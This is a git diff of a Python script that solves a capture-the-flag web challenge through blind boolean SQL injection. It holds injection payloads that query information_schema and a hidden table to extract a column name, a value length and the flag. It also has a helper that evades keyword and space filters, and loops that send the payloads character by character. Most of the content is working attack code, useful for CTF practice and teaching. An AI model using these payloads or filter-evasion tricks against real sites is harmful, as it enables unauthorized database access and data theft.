@@ -5,6 +5,13 @@ def extract(rawstr):
     newstr = rawstr.replace(' ',chr(0x0a)).replace('or','oorr')
     return newstr
 
+def addslashes(c):
+    strs = ['\'','\\','\"']
+    if c in strs:
+        return '\\'+c
+    else:
+        return c
+
 def main():
     url=r'http://ctf5.shiyanbar.com/web/earnest/index.php'
     ss=requests.session()
@@ -78,23 +85,68 @@ def main():
     #     if lens > 20:
     #         break
     # print("[+]lens:column_name_length:%d"%lens)
-    lens=5
-    strs = ''
-    model = "0'or(select((select group_concat(column_name) from information_schema.columns where table_name='fiag')) regexp '^%s')or'1'='"
-    tmp = model %('*')
-    payload = {'id':extract(tmp)}
-    res = ss.post(url,data=payload).content
-    print(res)
+    column_name_lens = 5
+    # strs = ''
+    # model = "0' or (select((select group_concat(column_name) from information_schema.columns where table_name='fiag')) regexp '%s$')or'1'='"
     # for i in range(5):
+    #     flag = False
     #     for c in cset:
-    #         tmp = model%(strs+c) 
+    #         tmp = model%(c + strs) 
+    #         payload = {'id':extract(tmp)}
+    #         #print(tmp)
+    #         res = ss.post(url,data=payload).content
+    #         if true_state in str(res):
+    #             flag = True
+    #             strs = c + strs
+    #             print(strs)
+    #             break
+    #     if not flag:
+    #         strs = '.' + strs
+    #         print(strs)
+    # print("column_name"+strs)
+    column_name = "fl.4g"  #.待确定
+
+    #用二分法手动注入知道第三位应该为$
+
+    column_name='fl$4g'
+
+    # model = "0' or (length((select fl$4g from fiag limit 1)) = '%d')or'1'='"
+    # lens = 1
+    # while True:
+    #     tmp = model % lens
+
+    #     payload = {'id':extract(tmp)}
+    #     res = ss.post(url,data=payload).content
+    #     if true_state in str(res):
+    #         break
+    #     lens = lens + 1
+    #     if lens > 20:
+    #         break
+    # print("len:%d"%lens)
+    lens = 19
+    # strs = ''
+    # model = "0' or (select ((select fl$4g from fiag limit 1)) regexp '%s$')or'1'='"
+    # for i in range(lens):
+    #     flag = False
+    #     for c in cset:
+    #         tmp = model %(c+strs)
     #         payload = {'id':extract(tmp)}
     #         res = ss.post(url,data=payload).content
     #         if true_state in str(res):
-    #             strs = strs + c
-    #             print("right:"+strs)
+    #             flag = True
+    #             strs = c + strs
+    #             print(strs)
     #             break
+    #     if not flag:
+    #         strs = '.' + strs
+    #         print(strs)
+    # print("strs:%s"%strs)
+    flag="flag{haha~you.win!}"
 
-    # column_name='ag$'
+    #可以通过二分法推断.为空格
+    flag="flag{haha~you win!}"
+
+
+
 if __name__== '__main__':
     main()
